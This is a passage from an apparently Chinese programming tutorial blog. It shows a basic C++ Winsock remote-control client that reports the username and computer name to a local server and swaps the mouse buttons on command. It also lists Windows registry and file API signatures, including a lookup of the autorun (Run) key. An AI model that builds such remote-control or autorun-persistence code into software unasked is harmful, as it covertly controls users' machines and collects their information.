class="keyword">else</span></span><br><span class="line">            <span class="built_in">send</span>(clientSock, CMD, <span class="built_in">strlen</span>(CMD) + <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(CMD, <span class="number">0</span>, MaxBuf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.断开Socket</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSock);</span><br><span class="line">    <span class="built_in">closesocket</span>(s);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Connection close\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.释放ws2_32库</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Resorces clean\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>client</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib,<span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxBuf = <span class="number">0x50</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开或关闭光驱</span></span><br><span class="line"><span class="comment">//VOID SetCdaudio(BOOL bOpen)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    if (bOpen)</span></span><br><span class="line"><span class="comment">//        mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);</span></span><br><span class="line"><span class="comment">//    else</span></span><br><span class="line"><span class="comment">//        mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">MouseSwap</span><span class="params">(BOOL bSwap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bSwap)</span><br><span class="line">        <span class="built_in">SwapMouseButton</span>(TRUE);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">SwapMouseButton</span>(FALSE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对命令进行解析</span></span><br><span class="line"><span class="function">BOOL <span class="title">Dispatch</span><span class="params">(SOCKET &amp;sock, <span class="type">char</span>* szCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szCmd, <span class="string">&quot;getsysinfo&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> szComputerName[MaxBuf];</span><br><span class="line">        <span class="type">char</span> szUserName[MaxBuf];</span><br><span class="line">        DWORD buffer1 = MaxBuf;</span><br><span class="line">        <span class="built_in">GetComputerNameA</span>(szComputerName, &amp;buffer1);</span><br><span class="line">        DWORD buffer2 = MaxBuf;</span><br><span class="line">        <span class="built_in">GetUserNameA</span>(szUserName, &amp;buffer2);</span><br><span class="line">        <span class="built_in">strcat</span>(szUserName, <span class="string">&quot;@&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(szUserName, szComputerName);</span><br><span class="line">        cout &lt;&lt; szUserName &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">send</span>(sock, szUserName, <span class="built_in">strlen</span>(szUserName) + <span class="built_in">sizeof</span>(<span class="type">char</span>),<span class="literal">NULL</span>);</span><br><span class="line">        bRet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//else if (!strcmp(szCmd, &quot;open&quot;))</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    SetCdaudio(1);</span></span><br><span class="line">    <span class="comment">//    bRet = 1;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//else if (!strcmp(szCmd, &quot;clsoe&quot;))</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    SetCdaudio(0);</span></span><br><span class="line">    <span class="comment">//    bRet = 1;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szCmd, <span class="string">&quot;swap&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MouseSwap</span>(<span class="number">1</span>);</span><br><span class="line">        bRet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szCmd, <span class="string">&quot;restore&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MouseSwap</span>(<span class="number">0</span>);</span><br><span class="line">        bRet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szCmd, <span class="string">&quot;exit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        bRet = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1.初始化DLL</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.创建Socket链接对象</span></span><br><span class="line">    SOCKET s = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    sockaddr_in sockaddr;</span><br><span class="line">    sockaddr.sin_family = PF_INET;</span><br><span class="line">    sockaddr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    sockaddr.sin_port = <span class="built_in">htons</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.连接到server</span></span><br><span class="line">    <span class="built_in">connect</span>(s, (SOCKADDR*)&amp;sockaddr, <span class="built_in">sizeof</span>(SOCKADDR));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.设置数据缓冲区</span></span><br><span class="line">    <span class="type">char</span> szBuffer[MAXBYTE];</span><br><span class="line">    <span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, MaxBuf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (s)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">recv</span>(s, szBuffer, MAXBYTE, <span class="literal">NULL</span>);</span><br><span class="line">            cout &lt;&lt; szBuffer &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">Dispatch</span>(s, szBuffer);</span><br><span class="line">            <span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, MaxBuf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.关闭socket</span></span><br><span class="line">    <span class="built_in">closesocket</span>(s);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client回传计算机相关信息有问题</p><h2 id="windows文件操作相关api"><a class="markdownIt-Anchor" href="#windows文件操作相关api"></a> Windows文件操作相关API</h2><h3 id="注册表相关"><a class="markdownIt-Anchor" href="#注册表相关"></a> 注册表相关</h3><h4 id="1打开注册表"><a class="markdownIt-Anchor" href="#1打开注册表"></a> 1.打开注册表</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegOpenKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY hKey;</span><br><span class="line"><span class="type">long</span> lRet = <span class="built_in">RegOpenKey</span>(keysname, REG_RUN, &amp;hKey);</span><br></pre></td></tr></table></figure><h4 id="2注册表查询"><a class="markdownIt-Anchor" href="#2注册表查询"></a> 2.注册表查询</h4><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya">https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,<span class="comment">//子键句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_to_opt_(*lpcchClass,*lpcchClass + <span class="number">1</span>) LPSTR lpClass,<span class="comment">//指向缓冲区的指针，该缓冲区接收用户定义的键类。此参数可以为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPDWORD lpcchClass, <span class="comment">//该变量指定lpClass参数指向的缓冲区的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Reserved_ LPDWORD lpReserved,<span class="comment">//此参数是保留参数，必须为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcSubKeys,<span class="comment">//指向一个变量的指针，该变量接收指定键所包含的子键的数量。此参数可以为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcbMaxSubKeyLen,<span class="comment">//指向变量的指针，该变量以最长的名称接收键的子键的大小，以Unicode字符表示，不包括终止的空字符</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcbMaxClassLen,<span class="comment">//指向变量的指针，该变量接收以Unicode字符表示的指定子项类的最长字符串的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcValues,<span class="comment">//指向变量的指针，该变量接收与键关联的值的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcbMaxValueNameLen,<span class="comment">//指向变量的指针，该变量接收键的最长值名称的大小（以Unicode字符表示）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcbMaxValueLen,<span class="comment">//指向一个变量的指针，该变量接收键值中最长的数据分量的大小（以字节为单位）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpcbSecurityDescriptor,<span class="comment">//指向一个变量的指针，该变量接收密钥的安全描述符的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ PFILETIME lpftLastWriteTime<span class="comment">//指向接收最后写入时间的FILETIME结构的指针 。此参数可以为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="3注册表写入"><a class="markdownIt-Anchor" href="#3注册表写入"></a> 3.注册表写入</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegSetKeyValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpValueName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(cbData) LPCVOID lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD cbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="4注册表值的枚举"><a class="markdownIt-Anchor" href="#4注册表值的枚举"></a> 4.注册表值的枚举</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwIndex,<span class="comment">//查询索引</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_to_opt_(*lpcchName,*lpcchName + <span class="number">1</span>) LPSTR lpName,<span class="comment">//子键名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPDWORD lpcchName,<span class="comment">//如果函数成功，则由lpcName指向的变量将包含存储在缓冲区中的字符数，不包括终止的空字符</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Reserved_ LPDWORD lpReserved,<span class="comment">//此参数是保留参数，必须为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_to_opt_(*lpcchClass,*lpcchClass + <span class="number">1</span>) LPSTR lpClass,<span class="comment">//该缓冲区接收枚举子项的用户定义类</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPDWORD lpcchClass,<span class="comment">//如果函数成功，则lpcClass包含缓冲区中存储的字符数，不包括终止的空字符</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ PFILETIME lpftLastWriteTime<span class="comment">//指向FILETIME结构的指针，该结构接收上一次写入枚举子键的时间</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="5键值删除"><a class="markdownIt-Anchor" href="#5键值删除"></a> 5.键值删除</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegDeleteKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpSubKey</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h3 id="文件操作相关"><a class="markdownIt-Anchor" href="#文件操作相关"></a> 文件操作相关</h3><h4 id="1打开文件"><a class="markdownIt-Anchor" href="#1打开文件"></a> 1.打开文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateFileA</span>(</span><br><span class="line">    _In_ LPCSTR lpFileName,               <span class="comment">//要打开的文件名字</span></span><br><span class="line">    _In_ DWORD dwDesiredAccess,           <span class="comment">//访问模式</span></span><br><span class="line">    _In_ DWORD dwShareMode,               <span class="comment">//文件的共享模式</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">//安全属性</span></span><br><span class="line">    _In_ DWORD dwCreationDisposition,     <span class="comment">//创建或打开文件不存在时的操作</span></span><br><span class="line">    _In_ DWORD dwFlagsAndAttributes,      <span class="comment">//创建或打开文件的标志和属性</span></span><br><span class="line">    _In_opt_ HANDLE hTemplateFile         <span class="comment">//文件模板</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="2关闭文件"><a class="markdownIt-Anchor" href="#2关闭文件"></a> 2.关闭文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CloseHandle</span>(</span><br><span class="line">    _In_ _Post_ptr_invalid_ HANDLE hObject</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><h4 id="3删除文件"><a class="markdownIt-Anchor" href="#3删除文件"></a> 3.删除文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">DeleteFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpFileName</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="4读函数"><a class="markdownIt-Anchor" href="#4读函数"></a> 4.读函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Must_inspect_result_</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hFile,<span class="comment">//文件句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) __out_data_source(FILE) LPVOID lpBuffer,  <span class="comment">//指向一个缓冲区，把数据读取到里面</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD nNumberOfBytesToRead,<span class="comment">//要读取的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpNumberOfBytesRead, <span class="comment">//返回实际的读取数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPOVERLAPPED lpOverlapped <span class="comment">//一般设置为NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="5写函数"><a class="markdownIt-Anchor" href="#5写函数"></a> 5.写函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpNumberOfBytesWritten,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="6设置文件指针"><a class="markdownIt-Anchor" href="#6设置文件指针"></a> 6.设置文件指针</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">SetFilePointer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hFile,<span class="comment">//打开的文件句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lDistanceToMove,<span class="comment">//指定要移动的距离</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ PLONG lpDistanceToMoveHigh,  <span class="comment">//要移动距离的高32位</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwMoveMethod<span class="comment">//指定移动位置</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="7创建目录"><a class="markdownIt-Anchor" href="#7创建目录"></a> 7.创建目录</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateDirectoryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpPathName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="8移动目录"><a class="markdownIt-Anchor" href="#8移动目录"></a> 8.移动目录</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">RemoveDirectoryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCSTR lpPathName</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h3 id="autoimmunity的mfc初体验"><a class="markdownIt-Anchor" href="#autoimmunity的mfc初体验"></a> AutoImmunity的MFC初体验</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 